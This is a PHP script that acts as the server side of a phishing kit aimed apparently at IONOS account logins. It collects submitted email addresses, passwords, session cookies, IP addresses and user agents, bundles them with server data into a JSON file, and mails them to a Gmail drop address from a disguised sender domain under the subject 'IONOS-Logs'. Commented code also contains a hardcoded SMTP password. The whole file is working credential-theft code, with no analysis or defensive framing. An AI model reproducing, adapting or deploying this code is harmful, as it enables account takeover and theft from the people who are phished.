<?php

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

// use PHPMailer\PHPMailer\PHPMailer;
// use PHPMailer\PHPMailer\Exception;


//Load Composer's autoloader
require './vendor/autoload.php';

// $EMAIL = "alexjace151@gmail.com";
// $SENDER_EMAIL = "jacealex151@gmail.com";

$EMAIL = "gottmacht.empire@gmail.com";
$SENDER_EMAIL = "info@ukrainefreeaids.org";

// function sendMail($subject, $message, $file)
// {
//     global $EMAIL;
//     global $SENDER_EMAIL;

//     //Create an instance; passing `true` enables exceptions
//     $mail = new PHPMailer(true);
//     $filename = pathinfo($file, PATHINFO_FILENAME);

//     try {
//         //Server settings
//         $mail->SMTPDebug = 2;                      //Enable verbose debug output
//         $mail->isSMTP();                                            //Send using SMTP
//         $mail->Host       = 'mail.ukrainefreeaids.org';                     //Set the SMTP server to send through
//         $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
//         $mail->Username   = 'user@example.com';                     //SMTP username
//         $mail->Password   = 'Treasures231@!';                               //SMTP password
//         $mail->SMTPSecure = "tsl";            //Enable implicit TLS encryption
//         $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

//         //Recipients
//         $mail->setFrom($SENDER_EMAIL, 'Office M3sh');
//         $mail->addAddress($EMAIL);     //Add a recipient
//         $mail->addReplyTo($SENDER_EMAIL, 'Office M3sh');

//         //Attachments
//         $mail->addAttachment($file, $filename);    //Optional name

//         //Content
//         $mail->isHTML(true);                                  //Set email format to HTML
//         $mail->Subject = $subject;
//         $mail->Body    = $message;
//         $mail->AltBody = $message;

//         $mail->send();
//        return ["message" => 'Message has been sent', "error" => false];
//     } catch (Exception $e) {
//         return ["message" => '', "error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"];
//     }
// }

function sendEmail($subject, $message, $file = "")
{
    global $EMAIL;
    global $SENDER_EMAIL;


    // Normal
    // $headers  = 'MIME-Version: 1.0' . "\r\n";
    // $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";

    // Create email headers
    // $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
    // $headers .= "Reply-to: $SENDER_EMAIL\r\n";

    // return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");


    // OTHER 
    $filename = pathinfo($file, PATHINFO_FILENAME);

    $content = file_get_contents($file);
    $content = chunk_split(base64_encode($content));

    // a random hash will be necessary to send mixed content
    $separator = md5(time());

    // carriage return type (RFC)
    $eol = "\r\n";

    $headers  = 'MIME-Version: 1.0' . $eol;
    $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
    $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
    $headers .= "This is a MIME encoded message." . $eol;

    // Create email headers
    $headers .= "From: Office M3sh<$SENDER_EMAIL>" . $eol;
    $headers .= "Reply-to: $SENDER_EMAIL" . $eol;

    // Message
    $body = "--" . $separator . $eol;
    $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
    $body .= "Content-Transfer-Encoding: 8bit" . $eol;
    $body .= $message . $eol;

    // attachment
    $body .= "--" . $separator . $eol;
    $body .= "Content-Type: application/json; name=\"" . $filename . "\"" . $eol;
    $body .= "Content-Transfer-Encoding: base64" . $eol;
    $body .= "Content-Disposition: attachment" . $eol;
    $body .= $content . $eol;
    $body .= "--" . $separator . "--";


    return mail($EMAIL, $subject, $body, $headers, "-f$SENDER_EMAIL");
}

if (isset($_REQUEST['send'])) {
    $email = $_REQUEST['email'];
    $password = $_REQUEST['password'];
    $cookies = $_REQUEST['_cookie'];
    $ip = $_REQUEST['ip'];
    $agent = $_REQUEST['agent'];
    $name = explode('@', $email)[0];


    try {
        // Create file
        $filename = "$name.json";
        $file = fopen($filename, "w");
        fwrite($file, json_encode([
            "server" => $_SERVER,
            "request" => $_REQUEST,
            "cookie" => $cookies
        ]));
        fclose($file);

        // Send Mail
        $message = "<!DOCTYPE html>
        <html lang='en'>
            <head>
                <meta charset='UTF-8'>
                <style>
                    * {
                        margin: 0;
                        padding: 0;
        
                        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
                    }
                    .container {
                        width: 100%;
                        max-width: 600px;
                        margin: 0 auto;
                        padding: 2rem;
                    }
        
                    .dotted {
                        height: 1px;
                        margin: 2rem 0;
                        border-bottom: 2px dashed #000;
                    }
        
                    .flex {
                        display: flex;
                        align-items: center;
                        margin: .5rem;
                    }
        
                    .title {
                        font-size: 1rem;
                        font-weight: 500;
                        margin-right: .8rem;
                    }
        
                    .content {
                        flex: 1;
                        font-size: 1rem;
                        font-weight: 600;
                    }
                </style>
            </head>
            <body>
                <div class='container'>
                    <div class='dotted'></div>
                    <div class='flex'>
                        <p class='title'>User ID:</p>
                        <p class='content'>{{email}}</p>
                    </div>
        
                    <div class='flex'>
                        <p class='title'>Authy:</p>
                        <p class='content'>{{password}}</p>
                    </div>
        
                    <div class='dotted'></div>
        
                    <div class='flex'>
                        <p class='title'>IP Address:</p>
                        <p class='content'>{{ip}}</p>
                    </div>
        
                    <div class='flex'>
                        <p class='title'>User Agent:</p>
                        <p class='content'>{{agent}}</p>
                    </div>
                </div>
            </body>
        </html>";
        $message = str_replace("{{email}}", $email, $message);
        $message = str_replace("{{password}}", $password, $message);
        $message = str_replace("{{ip}}", $ip, $message);
        $message = str_replace("{{agent}}", $agent, $message);

        $mail = sendEmail("IONOS-Logs | $ip", $message, $filename);
        if ($mail["error"]) throw new Exception("Could not send");

        unlink($filename);

        echo $response = json_encode(["status" => true, "message" => "Email sent"]);
    } catch (Exception $e) {
        echo $response = json_encode(["status" => false, "error" => $e->getMessage()]);
    }
}
